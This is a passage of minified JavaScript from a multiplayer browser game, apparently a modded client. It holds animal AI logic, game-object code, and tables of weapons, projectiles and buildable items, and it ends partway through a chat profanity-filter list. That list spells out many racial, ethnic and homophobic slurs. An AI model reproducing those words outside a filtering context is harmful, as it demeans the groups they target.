            (this.hitDelay = a.hitDelay),
            (this.hitScare = a.hitScare),
            (this.spriteMlt = a.spriteMlt),
            (this.nameScale = a.nameScale),
            (this.colDmg = a.colDmg),
            (this.noTrap = a.noTrap),
            (this.spawnDelay = a.spawnDelay),
            (this.minSpawnRange = a.minSpawnRange),
            (this.maxSpawnRange = a.maxSpawnRange),
            (this.hitWait = 0),
            (this.waitCount = 1e3),
            (this.moveCount = 0),
            (this.targetDir = 0),
            (this.active = !0),
            (this.alive = !0),
            (this.runFrom = null),
            (this.chargeTarget = null),
            (this.dmgOverTime = {});
    }),
        (this.getVolcanoAggression = function () {
        let t = a.getDistance(
            this.x,
            this.y,
            r.volcanoLocationX,
            r.volcanoLocationY
        ),
            n = t > r.volcanoAggressionRadius ? 0 : r.volcanoAggressionRadius - t;
        return (
            1 + r.volcanoAggressionPercentage * (1 - n / r.volcanoAggressionRadius)
        );
    });
    let c = 0;
    (this.update = function (t) {
        if (this.active) {
            if (this.spawnCounter) {
                if (
                    ((this.spawnCounter -= 1 * t * this.getVolcanoAggression()),
                     this.spawnCounter <= 0)
                ) {
                    if (
                        ((this.spawnCounter = 0), this.minSpawnRange || this.maxSpawnRange)
                    ) {
                        let o = r.mapScale * this.minSpawnRange,
                            s = r.mapScale * this.maxSpawnRange;
                        (this.x = a.randInt(o, s)), (this.y = a.randInt(o, s));
                    } else
                        (this.x = this.startX || a.randInt(0, r.mapScale)),
                            (this.y = this.startY || a.randInt(0, r.mapScale));
                }
                return;
            }
            (c -= t) <= 0 &&
                (this.dmgOverTime.dmg &&
                 (this.changeHealth(-this.dmgOverTime.dmg, this.dmgOverTime.doer),
                  (this.dmgOverTime.time -= 1),
                  this.dmgOverTime.time <= 0 && (this.dmgOverTime.dmg = 0)),
                 (c = 1e3));
            let d = !1,
                h = 1;
            if (
                (!this.zIndex &&
                 !this.lockMove &&
                 this.y >= r.mapScale / 2 - r.riverWidth / 2 &&
                 this.y <= r.mapScale / 2 + r.riverWidth / 2 &&
                 ((h = 0.33), (this.xVel += r.waterCurrent * t)),
                 this.lockMove)
            )
                (this.xVel = 0), (this.yVel = 0);
            else if (this.waitCount > 0) {
                if (((this.waitCount -= t), this.waitCount <= 0)) {
                    if (this.chargePlayer) {
                        let u, p, f;
                        for (var $, g, m = 0; m < i.length; ++m)
                            i[m].alive &&
                                !(i[m].skin && i[m].skin.bullRepel) &&
                                (f = a.getDistance(this.x, this.y, i[m].x, i[m].y)) <=
                                this.viewRange &&
                                (!u || f < p) &&
                                ((p = f), (u = i[m]));
                        u
                            ? ((this.chargeTarget = u),
                               (this.moveCount = a.randInt(8e3, 12e3)))
                        : ((this.moveCount = a.randInt(1e3, 2e3)),
                           (this.targetDir = a.randFloat(-Math.PI, Math.PI)));
                    } else
                        (this.moveCount = a.randInt(4e3, 1e4)),
                            (this.targetDir = a.randFloat(-Math.PI, Math.PI));
                }
            } else if (this.moveCount > 0) {
                var _ =
                    this.speed * h * (1 + 0 * r.MAX_SPEED) * this.getVolcanoAggression();
                if (
                    (this.runFrom &&
                     this.runFrom.active &&
                     !(this.runFrom.isPlayer && !this.runFrom.alive)
                     ? ((this.targetDir = a.getDirection(
                        this.x,
                        this.y,
                        this.runFrom.x,
                        this.runFrom.y
                    )),
                        (_ *= 1.42))
                     : this.chargeTarget &&
                     this.chargeTarget.alive &&
                     ((this.targetDir = a.getDirection(
                        this.chargeTarget.x,
                        this.chargeTarget.y,
                        this.x,
                        this.y
                    )),
                      (_ *= 1.75),
                      (d = !0)),
                     this.hitWait && (_ *= 0.3),
                     this.dir != this.targetDir)
                ) {
                    this.dir %= ot;
                    let k = (this.dir - this.targetDir + ot) % ot,
                        v = Math.min(Math.abs(k - ot), k, this.turnSpeed * t),
                        b = k - Math.PI >= 0 ? 1 : -1;
                    this.dir += b * v + ot;
                }
                (this.dir %= ot),
                    (this.xVel += _ * t * Math.cos(this.dir)),
                    (this.yVel += _ * t * Math.sin(this.dir)),
                    (this.moveCount -= t),
                    this.moveCount <= 0 &&
                    ((this.runFrom = null),
                     (this.chargeTarget = null),
                     (this.waitCount = this.hostile ? 1500 : a.randInt(1500, 6e3)));
            }
            (this.zIndex = 0), (this.lockMove = !1);
            let w = a.getDistance(0, 0, this.xVel * t, this.yVel * t),
                x = Math.min(4, Math.max(1, Math.round(w / 40))),
                S = 1 / x;
            for (var m = 0; m < x; ++m) {
                this.xVel && (this.x += this.xVel * t * S),
                    this.yVel && (this.y += this.yVel * t * S),
                    (A = n.getGridArrays(this.x, this.y, this.scale));
                for (var I = 0; I < A.length; ++I)
                    for (let P = 0; P < A[I].length; ++P)
                        A[I][P].active && n.checkCollision(this, A[I][P], S);
            }
            let O = !1;
            if (this.hitWait > 0 && ((this.hitWait -= t), this.hitWait <= 0)) {
                (O = !0),
                    (this.hitWait = 0),
                    this.leapForce &&
                    !a.randInt(0, 2) &&
                    ((this.xVel += this.leapForce * Math.cos(this.dir)),
                     (this.yVel += this.leapForce * Math.sin(this.dir)));
                var A,
                    $,
                    g,
                    A = n.getGridArrays(this.x, this.y, this.hitRange);
                for (let B = 0; B < A.length; ++B)
                    for (var I = 0; I < A[B].length; ++I)
                        ($ = A[B][I]).health &&
                            (g = a.getDistance(this.x, this.y, $.x, $.y)) <
                            $.scale + this.hitRange &&
                            ($.changeHealth(-(5 * this.dmg)) && n.disableObj($),
                             n.hitObj($, a.getDirection(this.x, this.y, $.x, $.y)));
                for (var I = 0; I < i.length; ++I)
                    i[I].canSee(this) && l.send(i[I].id, "J", this.sid);
            }
            if (d || O) {
                let D;
                for (var m = 0; m < i.length; ++m)
                    ($ = i[m]) &&
                        $.alive &&
                        ((g = a.getDistance(this.x, this.y, $.x, $.y)),
                         this.hitRange
                         ? !this.hitWait &&
                         g <= this.hitRange + $.scale &&
                         (O
                          ? ((D = a.getDirection($.x, $.y, this.x, this.y)),
                             $.changeHealth(
                        -this.dmg *
                        (1 + 0 * r.MAX_ATTACK) *
                        this.getVolcanoAggression()
                    ),
                             ($.xVel += 0.6 * Math.cos(D)),
                             ($.yVel += 0.6 * Math.sin(D)),
                             (this.runFrom = null),
                             (this.chargeTarget = null),
                             (this.waitCount = 3e3),
                             (this.hitWait = a.randInt(0, 2) ? 0 : 600))
                          : (this.hitWait = this.hitDelay))
                         : g <= this.scale + $.scale &&
                         ((D = a.getDirection($.x, $.y, this.x, this.y)),
                          $.changeHealth(
                        -this.dmg *
                        (1 + 0 * r.MAX_ATTACK) *
                        this.getVolcanoAggression()
                    ),
                          ($.xVel += 0.55 * Math.cos(D)),
                          ($.yVel += 0.55 * Math.sin(D))));
            }
            this.xVel && (this.xVel *= Math.pow(r.playerDecel, t)),
                this.yVel && (this.yVel *= Math.pow(r.playerDecel, t));
            let z = this.scale;
            this.x - z < 0
                ? ((this.x = z), (this.xVel = 0))
            : this.x + z > r.mapScale &&
                ((this.x = r.mapScale - z), (this.xVel = 0)),
                this.y - z < 0
                ? ((this.y = z), (this.yVel = 0))
            : this.y + z > r.mapScale &&
                ((this.y = r.mapScale - z), (this.yVel = 0)),
                this.isVolcanoAi &&
                (this.chargeTarget &&
                 (a.getDistance(
                this.chargeTarget.x,
                this.chargeTarget.y,
                r.volcanoLocationX,
                r.volcanoLocationY
            ) || 0) > r.volcanoAggressionRadius &&
                 (this.chargeTarget = null),
                 this.xVel &&
                 (this.x < r.volcanoLocationX - r.volcanoAggressionRadius
                  ? ((this.x = r.volcanoLocationX - r.volcanoAggressionRadius),
                     (this.xVel = 0))
                  : this.x > r.volcanoLocationX + r.volcanoAggressionRadius &&
                  ((this.x = r.volcanoLocationX + r.volcanoAggressionRadius),
                   (this.xVel = 0))),
                 this.yVel &&
                 (this.y < r.volcanoLocationY - r.volcanoAggressionRadius
                  ? ((this.y = r.volcanoLocationY - r.volcanoAggressionRadius),
                     (this.yVel = 0))
                  : this.y > r.volcanoLocationY + r.volcanoAggressionRadius &&
                  ((this.y = r.volcanoLocationY + r.volcanoAggressionRadius),
                   (this.yVel = 0))));
        }
    }),
        (this.canSee = function (t) {
        if (
            !t ||
            (t.skin && t.skin.invisTimer && t.noMovTimer >= t.skin.invisTimer)
        )
            return !1;
        let n = Math.abs(t.x - this.x) - t.scale,
            i = Math.abs(t.y - this.y) - t.scale;
        return (
            n <= (r.maxScreenWidth / 2) * 1.5 && i <= (r.maxScreenHeight / 2) * 1.5
        );
    });
    let d = 0,
        h = 0;
    (this.animate = function (t) {
        this.animTime > 0 &&
            ((this.animTime -= t),
             this.animTime <= 0
             ? ((this.animTime = 0), (this.dirPlus = 0), (d = 0), (h = 0))
             : 0 == h
             ? ((d += t / (this.animSpeed * r.hitReturnRatio)),
                (this.dirPlus = a.lerp(0, this.targetAngle, Math.min(1, d))),
                d >= 1 && ((d = 1), (h = 1)))
             : ((d -= t / (this.animSpeed * (1 - r.hitReturnRatio))),
                (this.dirPlus = a.lerp(0, this.targetAngle, Math.max(0, d)))));
    }),
        (this.startAnim = function () {
        (this.animTime = this.animSpeed = 600),
            (this.targetAngle = 0.8 * Math.PI),
            (d = 0),
            (h = 0);
    }),
        (this.changeHealth = function (t, n, i) {
        if (
            this.active &&
            ((this.health += t),
             i &&
             (this.hitScare && !a.randInt(0, this.hitScare)
              ? ((this.runFrom = i), (this.waitCount = 0), (this.moveCount = 2e3))
              : this.hostile && this.chargePlayer && i.isPlayer
              ? ((this.chargeTarget = i),
                 (this.waitCount = 0),
                 (this.moveCount = 8e3))
              : this.dontRun ||
              ((this.runFrom = i),
               (this.waitCount = 0),
               (this.moveCount = 2e3))),
             t < 0 && this.hitRange && a.randInt(0, 1) && (this.hitWait = 500),
             n &&
             n.canSee(this) &&
             t < 0 &&
             l.send(
                n.id,
                "8",
                Math.round(this.x),
                Math.round(this.y),
                Math.round(-t),
                1
            ),
             this.health <= 0)
        ) {
            if (this.spawnDelay)
                (this.spawnCounter = this.spawnDelay),
                    (this.x = -1e6),
                    (this.y = -1e6);
            else if (this.minSpawnRange || this.maxSpawnRange) {
                let o = r.mapScale * this.minSpawnRange,
                    c = r.mapScale * this.maxSpawnRange;
                (this.x = a.randInt(o, c)), (this.y = a.randInt(o, c));
            } else
                (this.x = this.startX || a.randInt(0, r.mapScale)),
                    (this.y = this.startY || a.randInt(0, r.mapScale));
            if (
                ((this.health = this.maxHealth),
                 (this.runFrom = null),
                 n && (s(n, this.killScore), this.drop))
            )
                for (let d = 0; d < this.drop.length; )
                    n.addResource(
                        r.resourceTypes.indexOf(this.drop[d]),
                        this.drop[d + 1]
                    ),
                        (d += 2);
        }
    });
}

function kc(t) {
    (this.sid = t),
        (this.init = function (t, n, i, o, a, r, s) {
        (r = r || {}),
            (this.sentTo = {}),
            (this.gridLocations = []),
            (this.active = !0),
            (this.doUpdate = r.doUpdate),
            (this.x = t),
            (this.y = n),
            (this.dir = i),
            document.getElementById("placeanim").checked
            ? ((this.xWiggle = -70 * Math.cos(this.dir)),
               (this.yWiggle = -70 * Math.sin(this.dir)))
        : ((this.xWiggle = 0), (this.yWiggle = 0)),
            (this.scale = o),
            (this.type = a),
            (this.id = r.id),
            (this.owner = s),
            (this.name = r.name),
            (this.isItem = null != this.id),
            (this.group = r.group),
            (this.health = this.maxHealth = r.health),
            (this.volatile = !1),
            (this.layer = 2),
            null != this.group
            ? (this.layer = this.group.layer)
        : 0 == this.type
            ? (this.layer = 3)
        : 2 == this.type
            ? (this.layer = 0)
        : 4 == this.type && (this.layer = -1),
            (this.colDiv = r.colDiv || 1),
            (this.blocker = r.blocker),
            (this.ignoreCollision = r.ignoreCollision),
            (this.dontGather = r.dontGather),
            (this.hideFromEnemy = r.hideFromEnemy),
            (this.friction = r.friction),
            (this.projDmg = r.projDmg),
            (this.dmg = r.dmg),
            (this.pDmg = r.pDmg),
            (this.pps = r.pps),
            (this.turnSpeed = r.turnSpeed),
            (this.req = r.req),
            (this.trap = r.trap),
            (this.healCol = r.healCol),
            (this.teleport = r.teleport),
            (this.shootCount = this.shootRate),
            (this.shootCount = this.shootRate);
    }),
        (this.changeHealth = function (t, n) {
        return (this.health += t), this.health <= 0;
    }),
        (this.getScale = function (t, n) {
        return (
            (t = t || 1),
            this.scale *
            (this.isItem || 2 == this.type || 3 == this.type || 4 == this.type
             ? 1
             : 0.6 * t) *
            (n ? 1 : this.colDiv)
        );
    }),
        (this.visibleToPlayer = function (t) {
        return (
            !this.hideFromEnemy ||
            (this.owner &&
             (this.owner == t || (this.owner.team && t.team == this.owner.team)))
        );
    }),
        (this.update = function (t) {
        this.active &&
            (this.xWiggle && (this.xWiggle *= Math.pow(0.99, t)),
             this.yWiggle && (this.yWiggle *= Math.pow(0.99, t)),
             this.turnSpeed &&
             document.getElementById("objturn").checked &&
             ("Slow" == document.getElementById("objTurnZpeed").value
              ? (this.dir += (this.turnSpeed / 2) * t)
              : "Normal" == document.getElementById("objTurnZpeed").value
              ? (this.dir += this.turnSpeed * t)
              : "Fast" == document.getElementById("objTurnZpeed").value &&
              (this.dir += 1.5 * this.turnSpeed * t)));
    }),
        (this.teamObj = function (t) {
        return (
            null != this.owner &&
            ((this.owner && t.sid === this.owner.sid) ||
             t.findAllianceBySid(this.owner.sid))
        );
    });
}
const j = [
    {
        id: 0,
        name: "food",
        layer: 0,
    },
    {
        id: 1,
        name: "walls",
        place: !0,
        limit: 30,
        layer: 0,
    },
    {
        id: 2,
        name: "spikes",
        place: !0,
        limit: 15,
        layer: 0,
    },
    {
        id: 3,
        name: "mill",
        place: !0,
        limit: 7,
        sandboxLimit: 299,
        layer: 1,
    },
    {
        id: 4,
        name: "mine",
        place: !0,
        limit: 1,
        layer: 0,
    },
    {
        id: 5,
        name: "trap",
        place: !0,
        limit: 6,
        layer: -1,
    },
    {
        id: 6,
        name: "booster",
        place: !0,
        limit: 12,
        sandboxLimit: 299,
        layer: -1,
    },
    {
        id: 7,
        name: "turret",
        place: !0,
        limit: 2,
        layer: 1,
    },
    {
        id: 8,
        name: "watchtower",
        place: !0,
        limit: 12,
        layer: 1,
    },
    {
        id: 9,
        name: "buff",
        place: !0,
        limit: 4,
        layer: -1,
    },
    {
        id: 10,
        name: "spawn",
        place: !0,
        limit: 1,
        layer: -1,
    },
    {
        id: 11,
        name: "sapling",
        place: !0,
        limit: 2,
        layer: 0,
    },
    {
        id: 12,
        name: "blocker",
        place: !0,
        limit: 3,
        layer: -1,
    },
    {
        id: 13,
        name: "teleporter",
        place: !0,
        limit: 2,
        sandboxLimit: 299,
        layer: -1,
    },
],
      vc = [
          {
              indx: 0,
              layer: 0,
              src: "arrow_1",
              dmg: 25,
              speed: 1.6,
              scale: 103,
              range: 1e3,
          },
          {
              indx: 1,
              layer: 1,
              dmg: 25,
              scale: 20,
          },
          {
              indx: 0,
              layer: 0,
              src: "arrow_1",
              dmg: 35,
              speed: 2.5,
              scale: 103,
              range: 1200,
          },
          {
              indx: 0,
              layer: 0,
              src: "arrow_1",
              dmg: 30,
              speed: 2,
              scale: 103,
              range: 1200,
          },
          {
              indx: 1,
              layer: 1,
              dmg: 16,
              scale: 20,
          },
          {
              indx: 0,
              layer: 0,
              src: "bullet_1",
              dmg: 50,
              speed: 3.6,
              scale: 160,
              range: 1400,
          },
      ],
      xc = [
          {
              id: 0,
              type: 0,
              name: "tool hammer",
              desc: "tool for gathering all resources",
              src: "hammer_1",
              length: 140,
              width: 140,
              xOff: -3,
              yOff: 18,
              dmg: 25,
              range: 65,
              gather: 1,
              speed: 300,
          },
          {
              id: 1,
              type: 0,
              age: 2,
              name: "hand axe",
              desc: "gathers resources at a higher rate",
              src: "axe_1",
              length: 140,
              width: 140,
              xOff: 3,
              yOff: 24,
              dmg: 30,
              spdMult: 1,
              range: 70,
              gather: 2,
              speed: 400,
          },
          {
              id: 2,
              type: 0,
              age: 8,
              pre: 1,
              name: "great axe",
              desc: "deal more damage and gather more resources",
              src: "great_axe_1",
              length: 140,
              width: 140,
              xOff: -8,
              yOff: 25,
              dmg: 35,
              spdMult: 1,
              range: 75,
              gather: 4,
              speed: 400,
          },
          {
              id: 3,
              type: 0,
              age: 2,
              name: "short sword",
              desc: "increased attack power but slower move speed",
              src: "sword_1",
              iPad: 1.3,
              length: 130,
              width: 210,
              xOff: -8,
              yOff: 46,
              dmg: 35,
              spdMult: 0.85,
              range: 110,
              gather: 1,
              speed: 300,
          },
          {
              id: 4,
              type: 0,
              age: 8,
              pre: 3,
              name: "katana",
              desc: "greater range and damage",
              src: "samurai_1",
              iPad: 1.3,
              length: 130,
              width: 210,
              xOff: -8,
              yOff: 59,
              dmg: 40,
              spdMult: 0.8,
              range: 118,
              gather: 1,
              speed: 300,
          },
          {
              id: 5,
              type: 0,
              age: 2,
              name: "polearm",
              desc: "long range melee weapon",
              src: "spear_1",
              iPad: 1.3,
              length: 130,
              width: 210,
              xOff: -8,
              yOff: 53,
              dmg: 45,
              knock: 0.2,
              spdMult: 0.82,
              range: 142,
              gather: 1,
              speed: 700,
          },
          {
              id: 6,
              type: 0,
              age: 2,
              name: "bat",
              desc: "fast long range melee weapon",
              src: "bat_1",
              iPad: 1.3,
              length: 110,
              width: 180,
              xOff: -8,
              yOff: 53,
              dmg: 20,
              knock: 0.7,
              range: 110,
              gather: 1,
              speed: 300,
          },
          {
              id: 7,
              type: 0,
              age: 2,
              name: "daggers",
              desc: "really fast short range weapon",
              src: "dagger_1",
              iPad: 0.8,
              length: 110,
              width: 110,
              xOff: 18,
              yOff: 0,
              dmg: 20,
              knock: 0.1,
              range: 65,
              gather: 1,
              hitSlow: 0.1,
              spdMult: 1.13,
              speed: 100,
          },
          {
              id: 8,
              type: 0,
              age: 2,
              name: "stick",
              desc: "great for gathering but very weak",
              src: "stick_1",
              length: 140,
              width: 140,
              xOff: 3,
              yOff: 24,
              dmg: 1,
              spdMult: 1,
              range: 70,
              gather: 7,
              speed: 400,
          },
          {
              id: 9,
              type: 1,
              age: 6,
              name: "hunting bow",
              desc: "bow used for ranged combat and hunting",
              src: "bow_1",
              req: ["wood", 4],
              length: 120,
              width: 120,
              dmg: 20,
              xOff: -6,
              yOff: 0,
              projectile: 0,
              spdMult: 0.75,
              speed: 600,
          },
          {
              id: 10,
              type: 1,
              age: 6,
              name: "great hammer",
              desc: "hammer used for destroying structures",
              src: "great_hammer_1",
              length: 140,
              width: 140,
              xOff: -9,
              yOff: 25,
              dmg: 10,
              spdMult: 0.88,
              range: 75,
              sDmg: 7.5,
              gather: 1,
              speed: 400,
          },
          {
              id: 11,
              type: 1,
              age: 6,
              name: "wooden shield",
              desc: "blocks projectiles and reduces melee damage",
              src: "shield_1",
              length: 120,
              width: 120,
              shield: 0.2,
              dmg: 0,
              xOff: 6,
              yOff: 0,
              spdMult: 0.7,
          },
          {
              id: 12,
              type: 1,
              age: 8,
              pre: 9,
              name: "crossbow",
              desc: "deals more damage and has greater range",
              src: "crossbow_1",
              req: ["wood", 5],
              aboveHand: !0,
              armS: 0.75,
              length: 120,
              width: 120,
              dmg: 30,
              xOff: -4,
              yOff: 0,
              projectile: 2,
              spdMult: 0.7,
              speed: 700,
          },
          {
              id: 13,
              type: 1,
              age: 9,
              pre: 12,
              name: "repeater crossbow",
              desc: "high firerate crossbow with reduced damage",
              src: "crossbow_2",
              req: ["wood", 10],
              aboveHand: !0,
              armS: 0.75,
              length: 120,
              width: 120,
              dmg: 25,
              xOff: -4,
              yOff: 0,
              projectile: 3,
              spdMult: 0.7,
              speed: 230,
          },
          {
              id: 14,
              type: 1,
              age: 6,
              name: "mc grabby",
              desc: "steals resources from enemies",
              src: "grab_1",
              length: 130,
              width: 210,
              xOff: -8,
              yOff: 53,
              dmg: 0,
              steal: 250,
              knock: 0.2,
              spdMult: 1.05,
              range: 125,
              gather: 0,
              speed: 700,
          },
          {
              id: 15,
              type: 1,
              age: 9,
              pre: 12,
              name: "musket",
              desc: "slow firerate but high damage and range",
              src: "musket_1",
              req: ["stone", 10],
              aboveHand: !0,
              rec: 0.35,
              armS: 0.6,
              hndS: 0.3,
              hndD: 1.6,
              dmg: 50,
              length: 205,
              width: 205,
              xOff: 25,
              yOff: 0,
              projectile: 5,
              hideProjectile: !0,
              spdMult: 0.6,
              speed: 1500,
          },
      ],
      dt = [
          {
              group: j[0],
              name: "apple",
              desc: "restores 20 health when consumed",
              req: ["food", 10],
              consume: function (t) {
                  return t.changeHealth(20, t);
              },
              healing: 20,
              scale: 22,
              holdOffset: 15,
          },
          {
              age: 3,
              group: j[0],
              name: "cookie",
              desc: "restores 40 health when consumed",
              req: ["food", 15],
              consume: function (t) {
                  return t.changeHealth(40, t);
              },
              healing: 40,
              scale: 27,
              holdOffset: 15,
          },
          {
              age: 7,
              group: j[0],
              name: "cheese",
              desc: "restores 30 health and another 50 over 5 seconds",
              req: ["food", 25],
              consume: function (t) {
                  return (
                      (!!t.changeHealth(30, t) || t.health < 100) &&
                      ((t.dmgOverTime.dmg = -10),
                       (t.dmgOverTime.doer = t),
                       (t.dmgOverTime.time = 5),
                       !0)
                  );
              },
              healing: 30,
              scale: 27,
              holdOffset: 15,
          },
          {
              group: j[1],
              name: "wood wall",
              desc: "provides protection for your village",
              req: ["wood", 10],
              projDmg: !0,
              health: 380,
              scale: 50,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 3,
              group: j[1],
              name: "stone wall",
              desc: "provides improved protection for your village",
              req: ["stone", 25],
              health: 900,
              scale: 50,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 7,
              pre: 1,
              group: j[1],
              name: "castle wall",
              desc: "provides powerful protection for your village",
              req: ["stone", 35],
              health: 1500,
              scale: 52,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              group: j[2],
              name: "spikes",
              desc: "damages enemies when they touch them",
              req: ["wood", 20, "stone", 5],
              health: 400,
              dmg: 20,
              scale: 49,
              spritePadding: -23,
              holdOffset: 8,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 5,
              group: j[2],
              name: "greater spikes",
              desc: "damages enemies when they touch them",
              req: ["wood", 30, "stone", 10],
              health: 500,
              dmg: 35,
              scale: 52,
              spritePadding: -23,
              holdOffset: 8,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 9,
              pre: 1,
              group: j[2],
              name: "poison spikes",
              desc: "poisons enemies when they touch them",
              req: ["wood", 35, "stone", 15],
              health: 600,
              dmg: 30,
              pDmg: 5,
              scale: 52,
              spritePadding: -23,
              holdOffset: 8,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 9,
              pre: 2,
              group: j[2],
              name: "spinning spikes",
              desc: "damages enemies when they touch them",
              req: ["wood", 30, "stone", 20],
              health: 500,
              dmg: 45,
              turnSpeed: 0.003,
              scale: 52,
              spritePadding: -23,
              holdOffset: 8,
              placeOffset: -5,
              a: !0,
          },
          {
              group: j[3],
              name: "windmill",
              desc: "generates gold over time",
              req: ["wood", 50, "stone", 10],
              health: 400,
              pps: 1,
              turnSpeed: 0.0016,
              spritePadding: 25,
              iconLineMult: 12,
              scale: 45,
              holdOffset: 20,
              placeOffset: 5,
              a: !0,
          },
          {
              age: 5,
              pre: 1,
              group: j[3],
              name: "faster windmill",
              desc: "generates more gold over time",
              req: ["wood", 60, "stone", 20],
              health: 500,
              pps: 1.5,
              turnSpeed: 0.0025,
              spritePadding: 25,
              iconLineMult: 12,
              scale: 47,
              holdOffset: 20,
              placeOffset: 5,
              a: !0,
          },
          {
              age: 8,
              pre: 1,
              group: j[3],
              name: "power mill",
              desc: "generates more gold over time",
              req: ["wood", 100, "stone", 50],
              health: 800,
              pps: 2,
              turnSpeed: 0.005,
              spritePadding: 25,
              iconLineMult: 12,
              scale: 47,
              holdOffset: 20,
              placeOffset: 5,
              a: !0,
          },
          {
              age: 5,
              group: j[4],
              type: 2,
              name: "mine",
              desc: "allows you to mine stone",
              req: ["wood", 20, "stone", 100],
              iconLineMult: 12,
              scale: 65,
              holdOffset: 20,
              placeOffset: 0,
          },
          {
              age: 5,
              group: j[11],
              type: 0,
              name: "sapling",
              desc: "allows you to farm wood",
              req: ["wood", 150],
              iconLineMult: 12,
              colDiv: 0.5,
              scale: 110,
              holdOffset: 50,
              placeOffset: -15,
          },
          {
              age: 4,
              group: j[5],
              name: "pit trap",
              desc: "pit that traps enemies if they walk over it",
              req: ["wood", 30, "stone", 30],
              trap: !0,
              ignoreCollision: !0,
              hideFromEnemy: !0,
              health: 500,
              colDiv: 0.2,
              scale: 50,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 4,
              group: j[6],
              name: "boost pad",
              desc: "provides boost when stepped on",
              req: ["stone", 20, "wood", 5],
              ignoreCollision: !0,
              boostSpeed: 1.5,
              health: 150,
              colDiv: 0.7,
              scale: 45,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 7,
              group: j[7],
              doUpdate: !0,
              name: "turret",
              desc: "defensive structure that shoots at enemies",
              req: ["wood", 200, "stone", 150],
              health: 800,
              projectile: 1,
              shootRange: 700,
              shootRate: 2200,
              scale: 43,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 7,
              group: j[8],
              name: "platform",
              desc: "platform to shoot over walls and cross over water",
              req: ["wood", 20],
              ignoreCollision: !0,
              zIndex: 1,
              health: 300,
              scale: 43,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 7,
              group: j[9],
              name: "healing pad",
              desc: "standing on it will slowly heal you",
              req: ["wood", 30, "food", 10],
              ignoreCollision: !0,
              healCol: 15,
              health: 400,
              colDiv: 0.7,
              scale: 45,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 9,
              group: j[10],
              name: "spawn pad",
              desc: "you will spawn here when you die but it will dissapear",
              req: ["wood", 100, "stone", 100],
              health: 400,
              ignoreCollision: !0,
              spawnPoint: !0,
              scale: 45,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 7,
              group: j[12],
              name: "blocker",
              desc: "blocks building in radius",
              req: ["wood", 30, "stone", 25],
              ignoreCollision: !0,
              blocker: 300,
              health: 400,
              colDiv: 0.7,
              scale: 45,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
          {
              age: 7,
              group: j[13],
              name: "teleporter",
              desc: "teleports you to a random point on the map",
              req: ["wood", 60, "stone", 60],
              ignoreCollision: !0,
              teleport: !0,
              health: 200,
              colDiv: 0.7,
              scale: 45,
              holdOffset: 20,
              placeOffset: -5,
              a: !0,
          },
      ];
for (let e = 0; e < dt.length; ++e)
    (dt[e].id = e), dt[e].pre && (dt[e].pre = e - dt[e].pre);
const R = {
    groups: j,
    projectiles: vc,
    weapons: xc,
    list: dt,
},
      bc = [
          "ahole",
          "anus",
          "ash0le",
          "ash0les",
          "asholes",
          "ass",
          "Ass Monkey",
          "Assface",
          "assh0le",
          "assh0lez",
          "asshole",
          "assholes",
          "assholz",
          "asswipe",
          "azzhole",
          "bassterds",
          "bastard",
          "bastards",
          "bastardz",
          "basterds",
          "basterdz",
          "Biatch",
          "bitch",
          "bitches",
          "Blow Job",
          "boffing",
          "butthole",
          "buttwipe",
          "c0ck",
          "c0cks",
          "c0k",
          "Carpet Muncher",
          "cawk",
          "cawks",
          "Clit",
          "cnts",
          "cntz",
          "cock",
          "cockhead",
          "cock-head",
          "cocks",
          "CockSucker",
          "cock-sucker",
          "crap",
          "cum",
          "cunt",
          "cunts",
          "cuntz",
          "dick",
          "dild0",
          "dild0s",
          "dildo",
          "dildos",
          "dilld0",
          "dilld0s",
          "dominatricks",
          "dominatrics",
          "dominatrix",
          "dyke",
          "enema",
          "f u c k",
          "f u c k e r",
          "fag",
          "fag1t",
          "faget",
          "fagg1t",
          "faggit",
          "faggot",
          "fagg0t",
          "fagit",
          "fags",
          "fagz",
          "faig",
          "faigs",
          "fart",
          "flipping the bird",
          "fuck",
          "fucker",
          "fuckin",
          "fucking",
          "fucks",
          "Fudge Packer",
          "fuk",
          "Fukah",
          "Fuken",
          "fuker",
          "Fukin",
          "Fukk",
          "Fukkah",
          "Fukken",
          "Fukker",
          "Fukkin",
          "g00k",
          "God-damned",
          "h00r",
          "h0ar",
          "h0re",
          "hells",
          "hoar",
          "hoor",
          "hoore",
          "jackoff",
          "jap",
          "japs",
          "jerk-off",
          "jisim",
          "jiss",
          "jizm",
          "jizz",
          "knob",
          "knobs",
          "knobz",
          "kunt",
          "kunts",
          "kuntz",
          "Lezzian",
          "Lipshits",
          "Lipshitz",
          "masochist",
          "masokist",
          "massterbait",
          "masstrbait",
          "masstrbate",
          "masterbaiter",
          "masterbate",
          "masterbates",
          "Motha Fucker",
          "Motha Fuker",
          "Motha Fukkah",
          "Motha Fukker",
          "Mother Fucker",
          "Mother Fukah",
          "Mother Fuker",
          "Mother Fukkah",
          "Mother Fukker",
          "mother-fucker",
          "Mutha Fucker",
          "Mutha Fukah",
          "Mutha Fuker",
          "Mutha Fukkah",
          "Mutha Fukker",
          "n1gr",
          "nastt",
          "nigger;",
          "nigur;",
          "niiger;",
          "niigr;",
          "orafis",
          "orgasim;",
          "orgasm",
          "orgasum",
          "oriface",
          "orifice",
          "orifiss",
          "packi",
          "packie",
          "packy",
          "paki",
          "pakie",
          "paky",
          "pecker",
          "peeenus",
          "peeenusss",
          "peenus",
          "peinus",
          "pen1s",
          "penas",
          "penis",
          "penis-breath",
          "penus",
          "penuus",
          "Phuc",
          "Phuck",
          "Phuk",
          "Phuker",
          "Phukker",
          "polac",
          "polack",
          "polak",
          "Poonani",
          "pr1c",
          "pr1ck",
          "pr1k",
          "pusse",
          "pussee",
          "pussy",
          "puuke",
          "puuker",
          "qweir",
          "recktum",
          "rectum",
          "retard",
          "sadist",
          "scank",
          "schlong",
          "screwing",
